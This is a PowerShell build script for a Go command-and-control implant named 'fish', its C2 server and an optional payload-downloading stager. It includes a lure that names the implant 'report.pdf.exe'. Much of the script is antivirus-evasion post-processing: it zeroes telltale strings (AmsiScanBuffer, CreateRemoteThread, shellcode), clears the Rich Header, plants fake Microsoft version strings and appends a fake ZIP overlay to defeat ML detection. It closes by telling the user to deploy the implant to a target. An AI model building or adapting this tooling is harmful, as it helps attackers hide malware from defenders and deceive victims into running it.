# Fish Build Script for Windows
# go build + evasion post-processing

param(
    [string]$C2Addr = "https://192.168.1.1:8443",
    [string]$Interval = "5",
    [string]$Jitter = "30",
    [string]$Platform = "windows",
    [string]$Arch = "amd64",
    [switch]$BuildStager = $false,
    [string]$StagerURL = "",
    [string]$DecryptKey = "85",
    [switch]$Garble = $false,
    [string]$GarbleSeed = "",
    [switch]$SkipPost = $false,
    [ValidateSet("lnk", "pdf")]
    [string]$Chain = "lnk",
    [string]$PdfName = "report"
)

$ErrorActionPreference = "Continue"

$env:GOOS = $Platform
$env:GOARCH = $Arch

Write-Host "[+] Building implant for $Platform/$Arch..."

# Build flags:
# -s -w: strip symbols and debug info
# -buildid=: clear Go build ID
# -trimpath: remove source paths
# -gcflags="all=-l": disable inlining
# -gcflags="all=-N": disable optimizations
$ldflags = "-s -w -buildid= -X main.c2Addr=$C2Addr -X main.intervalStr=$Interval -X main.jitterStr=$Jitter"

if ($Platform -eq "windows") {
    $ldflags = "$ldflags -H windowsgui"
}

$gcflags = "all=-l -N"

$outputName = if ($Platform -eq "windows") { 
    if ($Chain -eq "pdf") { "$PdfName.pdf.exe" } else { "fish.exe" }
} else { "fish_$Platform_$Arch" }

$buildTarget = "."
$chainLabel = "LNK"
if ($Chain -eq "pdf") {
    $buildTarget = "./pdf/"
    $chainLabel = "PDF"
}

Write-Host "[+] Chain: $chainLabel (target: $buildTarget)"

if ($Garble) {
    Write-Host "[+] Garble compilation enabled"
    $env:GARBLE_EXPERIMENTAL_CONTROLFLOW = "1"
    garble -tiny -literals -seed=random build -buildvcs=false -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
} else {
    go build -buildvcs=false -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
}

if ($LASTEXITCODE -ne 0) {
    Write-Host "[!] Build failed"
    exit 1
}
Write-Host "[+] Implant built: $outputName"

# Build C2 server
Write-Host "[+] Building C2 server..."
$env:GOOS = ""
$env:GOARCH = ""
go build -buildvcs=false -o fish-server.exe ./server/

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] Server built: fish-server.exe"
} else {
    Write-Host "[!] Server build failed"
    exit 1
}

# Build Stager (optional)
if ($BuildStager -and $Platform -eq "windows") {
    Write-Host "[+] Building stager..."
    $stagerLdflags = "-s -w -buildid= -H windowsgui -X main.downloadURL=$StagerURL -X main.decryptKeyStr=$DecryptKey"
    go build -buildvcs=false -trimpath -ldflags $stagerLdflags -gcflags $gcflags -o stager.exe ./stager/
    if ($LASTEXITCODE -eq 0) {
        Write-Host "[+] Stager built: stager.exe"
    } else {
        Write-Host "[!] Stager build failed"
    }
}

# Evasion post-processing (Windows only)
if ($Platform -eq "windows" -and -not $SkipPost) {
    Write-Host "[+] Applying evasion post-processing..."

    # 1. Modify PE timestamp
    go run -buildvcs=false ./evasion-tools/pepatch.go $outputName

    # 2. Zero Go build ID strings + runtime fingerprints + sensitive API names + Rich Header
    # NOTE: Do NOT modify PE Section names! Triggers Microsoft Wacatac.B!ml ML detection
    Write-Host "[+] Removing Go binary fingerprints + sensitive strings..."
    $bytes = [System.IO.File]::ReadAllBytes($outputName)
    $patterns = @(
        [System.Text.Encoding]::ASCII.GetBytes("Go build ID: "),
        [System.Text.Encoding]::ASCII.GetBytes("Go buildinf"),
        [System.Text.Encoding]::ASCII.GetBytes("go.buildid"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.main"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.goexit"),
        [System.Text.Encoding]::ASCII.GetBytes("main.main"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.init"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.gc"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.morestack"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.gcWriteBarrier"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.writebarrier"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.allocmon"),
        [System.Text.Encoding]::ASCII.GetBytes("type..eq"),
        [System.Text.Encoding]::ASCII.GetBytes("type..hash"),
        [System.Text.Encoding]::ASCII.GetBytes("shellcode"),
        [System.Text.Encoding]::ASCII.GetBytes("VirtualAlloc"),
        [System.Text.Encoding]::ASCII.GetBytes("VirtualProtect"),
        [System.Text.Encoding]::ASCII.GetBytes("NtAllocateVirtualMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("NtProtectVirtualMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("AmsiScanBuffer"),
        [System.Text.Encoding]::ASCII.GetBytes("EtwEventWrite"),
        [System.Text.Encoding]::ASCII.GetBytes("CreateRemoteThread"),
        [System.Text.Encoding]::ASCII.GetBytes("WriteProcessMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("ntdll"),
        [System.Text.Encoding]::ASCII.GetBytes("kernel32"),
        [System.Text.Encoding]::ASCII.GetBytes("EnumWindows"),
        [System.Text.Encoding]::ASCII.GetBytes("NtWriteVirtualMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("NtCreateThread"),
        [System.Text.Encoding]::ASCII.GetBytes("RtlCopyMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("GetProcAddress"),
        [System.Text.Encoding]::ASCII.GetBytes("LoadLibrary"),
        [System.Text.Encoding]::ASCII.GetBytes("user32"),
        [System.Text.Encoding]::ASCII.GetBytes("EnumChildWindows"),
        [System.Text.Encoding]::ASCII.GetBytes("GetDesktopWindow"),
        [System.Text.Encoding]::ASCII.GetBytes("GetWindowText"),
        [System.Text.Encoding]::ASCII.GetBytes("GetTickCount"),
        [System.Text.Encoding]::ASCII.GetBytes("GetTickCount64"),
        [System.Text.Encoding]::ASCII.GetBytes("IsDebuggerPresent"),
        [System.Text.Encoding]::ASCII.GetBytes("GlobalMemoryStatus"),
        [System.Text.Encoding]::ASCII.GetBytes("GlobalMemoryStatusEx"),
        [System.Text.Encoding]::ASCII.GetBytes("CreateFile"),
        [System.Text.Encoding]::ASCII.GetBytes("ReadFile"),
        [System.Text.Encoding]::ASCII.GetBytes("CloseHandle"),
        [System.Text.Encoding]::ASCII.GetBytes("GetFileSize"),
        [System.Text.Encoding]::ASCII.GetBytes("nautilus"),
        [System.Text.Encoding]::ASCII.GetBytes("fish"),
        [System.Text.Encoding]::ASCII.GetBytes("C2"),
        [System.Text.Encoding]::ASCII.GetBytes("implant"),
        [System.Text.Encoding]::ASCII.GetBytes("stager"),
        [System.Text.Encoding]::ASCII.GetBytes("golang.org/x/crypto"),
        [System.Text.Encoding]::ASCII.GetBytes("crypto/aes"),
        [System.Text.Encoding]::ASCII.GetBytes("crypto/rand"),
        [System.Text.Encoding]::ASCII.GetBytes("crypto/sha"),
        [System.Text.Encoding]::ASCII.GetBytes("encoding/base64"),
        [System.Text.Encoding]::ASCII.GetBytes("net/http"),
        [System.Text.Encoding]::ASCII.GetBytes("net.Dial"),
        [System.Text.Encoding]::ASCII.GetBytes("reflect.TypeOf"),
        [System.Text.Encoding]::ASCII.GetBytes("fmt.Sprintf")
    )
    $replaced = 0
    foreach ($pattern in $patterns) {
        for ($i = 0; $i -lt $bytes.Length - $pattern.Length; $i++) {
            $match = $true
            for ($j = 0; $j -lt $pattern.Length; $j++) {
                if ($bytes[$i + $j] -ne $pattern[$j]) { $match = $false; break }
            }
            if ($match) {
                for ($j = 0; $j -lt $pattern.Length; $j++) { $bytes[$i + $j] = 0x00 }
                $replaced++
            }
        }
    }
    [System.IO.File]::WriteAllBytes($outputName, $bytes)
    Write-Host "[+] Go fingerprint strings zeroed: $replaced occurrences"

    # 3. Clear Rich Header (Go compiler fingerprint)
    Write-Host "[+] Clearing Rich Header..."
    $bytes = [System.IO.File]::ReadAllBytes($outputName)
    $richSig = [System.Text.Encoding]::ASCII.GetBytes("Rich")
    for ($i = 0; $i -lt [Math]::Min($bytes.Length, 4096); $i++) {
        $match = $true
        for ($j = 0; $j -lt 4; $j++) {
            if ($bytes[$i + $j] -ne $richSig[$j]) { $match = $false; break }
        }
        if ($match) {
            $richEnd = $i + 8
            $richStart = $i
            for ($k = $i - 1; $k -ge 0; $k--) {
                if ($bytes[$k] -eq 0x53 -and $bytes[$k+1] -eq 0x6E -and $bytes[$k+2] -eq 0x61 -and $bytes[$k+3] -eq 0x44) {
                    $richStart = $k
                    break
                }
            }
            for ($k = $richStart; $k -lt $richEnd -and $k -lt $bytes.Length; $k++) {
                $bytes[$k] = 0x00
            }
            Write-Host "[+] Rich Header cleared at offset $richStart"
            break
        }
    }
    [System.IO.File]::WriteAllBytes($outputName, $bytes)

    # 4. Add fake legitimate program signature strings
    Write-Host "[+] Adding legitimate program signatures..."
    $legitStrings = @(
        [System.Text.Encoding]::ASCII.GetBytes("Microsoft Visual Studio"),
        [System.Text.Encoding]::ASCII.GetBytes("Copyright (C) 2024 Microsoft"),
        [System.Text.Encoding]::ASCII.GetBytes("Windows Application"),
        [System.Text.Encoding]::ASCII.GetBytes("FileVersion=1.0.0.1"),
        [System.Text.Encoding]::ASCII.GetBytes("ProductVersion=1.0.0.1"),
        [System.Text.Encoding]::ASCII.GetBytes("CompanyName=Microsoft"),
        [System.Text.Encoding]::ASCII.GetBytes("FileDescription=System Utility"),
        [System.Text.Encoding]::ASCII.GetBytes("InternalName=apphelper"),
        [System.Text.Encoding]::ASCII.GetBytes("OriginalFilename=apphelper.exe"),
        [System.Text.Encoding]::ASCII.GetBytes("ProductName=Windows Helper"),
        [System.Text.Encoding]::ASCII.GetBytes("LegalCopyright=Copyright (C) Microsoft Corp"),
        [System.Text.Encoding]::ASCII.GetBytes("assembly version"),
        [System.Text.Encoding]::ASCII.GetBytes(".NET Framework"),
        [System.Text.Encoding]::ASCII.GetBytes("mscorlib.dll"),
        [System.Text.Encoding]::ASCII.GetBytes("System.Runtime"),
        [System.Text.Encoding]::ASCII.GetBytes("application config"),
        [System.Text.Encoding]::ASCII.GetBytes("settings.json"),
        [System.Text.Encoding]::ASCII.GetBytes("log.txt")
    )
    $bytes = [System.IO.File]::ReadAllBytes($outputName)
    $insertOffset = $bytes.Length - 1024
    foreach($str in $legitStrings) {
        if ($insertOffset + $str.Length -lt $bytes.Length) {
            for ($i = 0; $i -lt $str.Length; $i++) {
                $bytes[$insertOffset + $i] = $str[$i]
            }
            $insertOffset += $str.Length + 5
        }
    }
    [System.IO.File]::WriteAllBytes($outputName, $bytes)
    Write-Host "[+] Legitimate signatures added"

    # 5. Append random overlay data (32KB with fake ZIP header to break ML signatures)
    $randomBytes = New-Object byte[] 32768
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($randomBytes)
    $randomBytes[0] = 0x50  # 'P'
    $randomBytes[1] = 0x4B  # 'K'
    $randomBytes[2] = 0x03  # ZIP local file header
    $randomBytes[3] = 0x04
    $original = [System.IO.File]::ReadAllBytes($outputName)
    $modified = New-Object byte[] ($original.Length + $randomBytes.Length)
    [System.Array]::Copy($original, $modified, $original.Length)
    [System.Array]::Copy($randomBytes, 0, $modified, $original.Length, $randomBytes.Length)
    [System.IO.File]::WriteAllBytes($outputName, $modified)
    Write-Host "[+] Overlay data appended (32768 bytes with ZIP signature)"
}

# Summary
$fileInfo = Get-Item $outputName
Write-Host ""
Write-Host "=== Build Summary ==="
Write-Host "[+] Platform: $Platform/$Arch"
Write-Host "[+] Implant: $outputName ($($fileInfo.Length) bytes)"
Write-Host "[+] Server: fish-server.exe"
Write-Host "[+] Chain: $chainLabel"
$garbleStatus = if ($Garble) { "Yes (-tiny -literals)" } else { "No (use -Garble to enable)" }
Write-Host "[+] Garble: $garbleStatus"
Write-Host "[+] Evasion: API Hashing + Callback Exec + String Zeroing + PE Timestamp + Rich Header Clear + Overlay"
if ($BuildStager) {
    $stagerInfo = Get-Item stager.exe -ErrorAction SilentlyContinue
    if ($stagerInfo) {
        Write-Host "[+] Stager: stager.exe ($($stagerInfo.Length) bytes)"
    }
}
Write-Host ""
Write-Host "Usage:"
Write-Host "  Server:  fish-server.exe [listen_addr]   (default :8443)"
Write-Host "  Implant: Deploy $outputName to target"
